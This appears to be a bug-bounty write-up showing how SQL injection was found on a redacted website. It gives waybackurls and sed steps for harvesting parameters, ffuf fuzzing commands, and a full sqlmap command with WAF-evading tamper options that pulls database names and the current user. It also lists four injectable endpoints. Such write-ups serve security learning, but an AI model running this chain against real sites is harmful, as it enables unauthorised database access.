
ref: https://0xmahmoudjo0.medium.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-9c3bb3780e8f

## Enumeration Phase:

`waybackurls https://redacted.org/ | uro | grep ".php" > php-files.txt`

![image](https://user-images.githubusercontent.com/37910997/158051736-c06d205d-2d01-462d-b415-d2876478c4e2.png)

![image](https://user-images.githubusercontent.com/37910997/158051756-67425eaa-82e4-4c06-8cbc-f74e4ae01e25.png)

```
waybackurls => https://github.com/tomnomnom/waybackurls
uro => https://github.com/s0md3v/uro
```

## Getting Parameters:

`cat php-files.txt| grep -i get | sed 's/.*.get//' | sort -u`

![image](https://user-images.githubusercontent.com/37910997/158052135-c2b8525f-4b29-423f-83c0-1ace98f7e9b8.png)

`cut -f1 -d"."`

![image](https://user-images.githubusercontent.com/37910997/158052170-b61c0137-2ca9-4776-bbf5-a8457ee502ef.png)

`sed '/[A-Z]\+/\n&/g'`

![image](https://user-images.githubusercontent.com/37910997/158052233-fe8f5937-c7a9-4dcf-8501-3f0b6816b099.png)

![image](https://user-images.githubusercontent.com/37910997/158052254-af877633-41e5-4571-b806-e06c72ecc01a.png)

`ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"`

use vps LOL

`ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"`

## Exploitation:

`sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms="MYSQL" --hostname --current-user --current-db --dbs --tamper=between --no-cast`

```
--level 5 --> Level of tests to perform.
--risk 3 --> Risk of tests to perform
--dbms --> back-end DBMS value
--no-cast --> to avoid use cast-alike statements during data fetching
--tamper --> to evade filters and WAF’s
"--hostname --current-user --current-db --dbs" --> to retrieve info about the database
```

![image](https://user-images.githubusercontent.com/37910997/158052314-19e18d72-80ef-43c8-96b5-5c0f0cae1c6d.png)

Second SQLI : ws_delComment.php with id parameter
![image](https://user-images.githubusercontent.com/37910997/158052320-29e8ef8e-c747-47c5-ad36-67f383817946.png)

Third SQLI: getTargets.php with goal parameter
![image](https://user-images.githubusercontent.com/37910997/158052324-c88173a4-9e16-47da-b170-54313441f3ac.png)

Fourth One: mailing_lists.php with list parameter
![image](https://user-images.githubusercontent.com/37910997/158052336-bfcf66a5-b69b-4e58-b9c3-539d9e829a40.png)


